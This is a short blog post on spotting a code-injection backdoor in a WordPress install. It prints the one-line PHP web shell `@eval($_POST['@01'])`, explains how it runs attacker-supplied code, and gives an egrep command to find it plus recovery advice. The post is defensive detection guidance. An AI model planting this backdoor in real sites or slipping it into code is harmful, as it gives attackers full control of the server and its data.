---
title: Code Injection Attacks in WordPress
date: 2017-07-05
---

tl;dr: If you find this line of code in any files of your WordPress install, get worried, **get rid of it immediately**.

```php
<?php @eval($_POST['@01']);?>
```

> With this line of code, the hacker will be able to **execute any code he wants**. Therefore this code will have the power to **read, update or delete any data he wants**.

> We don't know yet what code he will choose to execute because the code will be passed as a `$_POST` argument. The `$_POST[1]` argument will contain a string of executable code. Then, `eval()` will be called with this argument to execute that code.

> When the hacker will call your page, passing it some code as a POST argument, he will be performing an attack that is called **code injection**.

> Now that you know that, you have to figure out:

> 1. What **damage** has already been done in order to undo it, if possible?
> 2. What **security breach** allowed the hacker to add the "eval" code to your code base?

> If you decide to restore a backup, make sure the "eval" code is not already in your backup. Then, solve problem #2 because the hacker will probably just re-use the same security breach to restore his hack. Even if your backup is clean, the security breach will still be there.

```bash
# egrep -lri '@eval' .
./public_html/wp-content/_themes/business-one-page/404.php
```

Links
---
- [StackOverflow: What is the meaning of @eval($_POST[1])](https://stackoverflow.com/questions/36374420/what-is-the-meaning-of-eval-post1)
